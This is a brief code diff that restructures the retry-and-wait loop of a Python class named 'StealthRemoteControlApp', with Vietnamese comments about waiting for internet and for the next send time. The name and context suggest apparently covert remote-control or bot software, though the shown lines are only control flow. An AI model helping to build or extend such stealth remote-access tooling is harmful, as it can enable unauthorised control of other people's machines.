@@ -708,15 +708,15 @@ class StealthRemoteControlApp:
                         except:
                             pass
                         self.last_bot_warning = current_time
-                else:
-                    # Chưa đến lúc gửi, đợi thêm
-                    time.sleep(2)
-                else:
+                elif not self.internet_checker.is_online():
                     # Không có internet, đợi đến khi có kết nối
                     try:
                         self.internet_checker.wait_for_connection()
                     except:
                         time.sleep(10)
+                else:
+                    # Chưa đến lúc gửi, đợi thêm
+                    time.sleep(2)
                 
         except KeyboardInterrupt:
             self.stop()
